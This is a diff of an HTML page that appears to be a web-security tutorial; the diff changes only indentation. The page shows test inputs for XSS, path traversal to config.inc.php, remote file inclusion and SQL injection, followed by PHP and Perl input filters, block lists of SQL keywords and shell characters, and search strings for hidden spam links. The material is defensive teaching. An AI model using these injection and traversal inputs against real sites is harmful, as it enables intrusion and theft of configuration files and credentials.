@@ -1078,9 +1079,9 @@ Your URLs look like this (to be adapted to your situation):</p>
 <pre class="smallfont code">http://www.yourdomain.tld/?page=javascript:alert(%22Hack me if you can!!!%22)</pre>
 						<p>If a javascript alert window appears with the text <em>“Hack me if you can!!!”</em>, your site is open to this kind of attack.</p>
 						<p><strong>3- Weakness in file downloading:</strong><br>
-This applies to 2 cases:</p>
+						This applies to 2 cases:</p>
 						<p>a) You have an upload script that offers your visitors to take files. You have put all the files to download in a folder on your hosting, for example /home/loginftp/www/download/ .<br>
-Your URL looks like this (to be adapted to your situation):</p>
+						Your URL looks like this (to be adapted to your situation):</p>
 <span class="smallfont">Code:</span>
 <pre class="smallfont code">http://www.yourdomain.tld/download.php?file=myfile.pdf</pre>
 						<p>If we change “myfile.pdf” which is in the folder “/home/loginftp/www/download/” by “../config.inc.php” which is here “/home/loginftp/www/” like that:</p>
@@ -1100,7 +1101,7 @@ Your URL looks like this (to be adapted to your situation):</p>
 						<p>Hopefully, with some hosting providers the PHP include() function does not allow you to open a file outside your hosting (for security reasons). But this should be possible on other less secure servers:</p>
 <span class="smallfont">Code:</span>
 <pre class="smallfont code">http://www.yourdomain.tld/?page=http://www.otherwebsite.tld</pre>
-<a id="filtrephp"></a><hr><br>
+						<a id="filtrephp"></a><hr><br>
 						<header>
 							<h2>Securing a PHP script</h2>
 						</header>
@@ -1133,9 +1134,9 @@ All other characters are deleted.</p>
 <span style="color: #19177C">$variable</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^_A-Za-z0-9-\.&amp;=]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;variable&quot;</span>]);
 </pre></div>
 						<p>This is a general protection that works against the simplest forms of hacking.<br>
-Put this code only if there is no filtering system.</p>
+						Put this code only if there is no filtering system.</p>
 						<p>Starting with PHP 5.2, there is a series of filters that allow the filtering of data: <a href="https://www.php.net/filter">https://www.php.net/filter</a>.</p>
-<a id="filtreperl"></a><hr><br>
+						<a id="filtreperl"></a><hr><br>
 						<header>
 							<h2>Securing a PERL script</h2>
 						</header>
@@ -1148,9 +1149,9 @@ Put this code only if there is no filtering system.</p>
 <span style="color: #19177C">$val</span> <span style="color: #666666">=~</span> <span style="color: #BB6688">s/([&lt;&gt;\&amp;\$;:\`\|\&quot;\&#39;*\?\!\~\^\(\)\[\]\{\}]|\\|\.\.|^\/)//g</span>;
 </pre></div>
 						<p>First, we decode the non-alphanumeric characters that are url-encoded. Then, we erase the characters that can cause problems such as html tags and some characters in the 4th line of the above code.<br>
-This is a general protection that works against the simplest forms of hacking.</p>
+						This is a general protection that works against the simplest forms of hacking.</p>
 						<p>Insert this code only if there is no filtering system.</p>
-<a id="injectsql"></a><hr><br>
+						<a id="injectsql"></a><hr><br>
 						<header>
 							<h2>Countering SQL injections</h2>
 						</header>
@@ -1171,14 +1172,14 @@ This is a general protection that works against the simplest forms of hacking.</
 						<p>And it would certainly identify the user successfully because the query is true if a user '' exists OR if 1=1. Since the user <em>empty</em> does not exist, but 1 is equal to 1, then the query is true and valid. So, by adding this code, we force to believe that any query is true. The “//” sign means a comment in PHP, the rest of the code is not interpreted, it is rendered useless. And here you are with a database access! This is the simplest example, many others allow you to really take control of a server by pretending to be root or the administrator. The possibilities are unfortunately numerous. We will not develop them.</p>
 						<p><strong>How to protect against SQL injection attacks?</strong></p>
 						<p>To prevent these attacks, you need to know how to write code. If it is well done, attacks are no longer possible. Here are some tips:<br>
-Avoid using an account with full authority to run your SQL server.<br>
-Delete the functions you don't use such as master..xp_cmdshell, and in general all those beginning with “master..xp”.<br>
-Check user entries such as text fields. Also check that the expected numbers are numbers with a function such as IsNumeric() for example.<br>
-Also make sure to filter the parameters of URLs that are manually added.<br>
-Use escape characters and functions such as AddStripSlashes() in PHP, see the function specifications and, in general, the documentation for your programming languages for more information. This will prevent user input of the ' character by escaping it with a slash before it.<br>
-Generally prevent some user input sequences such as “;”, “insert”, “select”, “//”, “--”, etc.<br>
-Limit the number of characters that a user can enter in a text field, as this may well make it more difficult for them to do so.<br>
-Be careful what you put in the cookies because a password (even encrypted in md5) is quickly found by an attack of this type. Afterwards, a replacement of this value in the cookie saves the attacker from a brute force attack, so it is a nice gift.</p>
+						Avoid using an account with full authority to run your SQL server.<br>
+						Delete the functions you don't use such as master..xp_cmdshell, and in general all those beginning with “master..xp”.<br>
+						Check user entries such as text fields. Also check that the expected numbers are numbers with a function such as IsNumeric() for example.<br>
+						Also make sure to filter the parameters of URLs that are manually added.<br>
+						Use escape characters and functions such as AddStripSlashes() in PHP, see the function specifications and, in general, the documentation for your programming languages for more information. This will prevent user input of the ' character by escaping it with a slash before it.<br>
+						Generally prevent some user input sequences such as “;”, “insert”, “select”, “//”, “--”, etc.<br>
+						Limit the number of characters that a user can enter in a text field, as this may well make it more difficult for them to do so.<br>
+						Be careful what you put in the cookies because a password (even encrypted in md5) is quickly found by an attack of this type. Afterwards, a replacement of this value in the cookie saves the attacker from a brute force attack, so it is a nice gift.</p>
 						<p><strong>Practical application</strong></p>
 						<p>The simplest method is to filter all variables by applying php filters like this:</p>
 <span class="smallfont">Code PHP:</span>
@@ -1223,18 +1224,18 @@ Be careful what you put in the cookies because a password (even encrypted in md5
 <span style="color: #19177C">$pseudo</span> <span style="color: #666666">=</span> <span style="color: #19177C">$login</span>[<span style="color: #BA2121">&#39;user&#39;</span>]; <span style="color: #408080; font-style: italic">// we get the nickname</span>
 <span style="color: #BC7A00">?&gt;</span> 
 </pre></div>
-<a id="piratesavoir"></a><hr><br>
+						<a id="piratesavoir"></a><hr><br>
 						<header>
 							<h2>Were you unknowingly hacked?</h2>
 						</header>
 						<p>You have a CMS, blog or e-commerce? You may have been unknowingly hacked by hackers who want to put links to their websites in order to artificially increase their Pagerank.<br>
-Careful, this is very serious. it is an invisible, almost benign, but very real hack. If you find the elements described below, your CMS, blog or e-commerce has been hacked by professionals paid for it, not by kids who have fun deleting sites by inserting their pseudonyms instead. <br>
-Login to your phpMyadmin.<br>
-Once identified, in the top left-hand column, click on the name of your database, then in the main window, at the top click on the Search tab.<br>
-Then enter one of the 3 sentences: <br>
-%display:none%<br>
-%height:0%<br>
-%visibility:hidden%</p>
+						Careful, this is very serious. it is an invisible, almost benign, but very real hack. If you find the elements described below, your CMS, blog or e-commerce has been hacked by professionals paid for it, not by kids who have fun deleting sites by inserting their pseudonyms instead. <br>
+						Login to your phpMyadmin.<br>
+						Once identified, in the top left-hand column, click on the name of your database, then in the main window, at the top click on the Search tab.<br>
+						Then enter one of the 3 sentences: <br>
+						%display:none%<br>
+						%height:0%<br>
+						%visibility:hidden%</p>
 						<p>If you find entries in the texts of your pages or comments containing “display:none” or “height:0” or “visibility:hidden”, so you were hacked. These web links to the hackers' sites are invisible but present in the code and visible by the indexing robots. Delete these links, change your password, update your software and follow the advice in this article.</p>
 						<p>And if you notice a strange behaviour of your CMS, blog or e-commerce, take the opportunity to check that there are no new files or folders added or modified recently by installing <a href="#fichmodif">the script described here.</a> It may be your CMS, blog or e-commerce that did this, but it is better to be sure.</p>
 					</section>
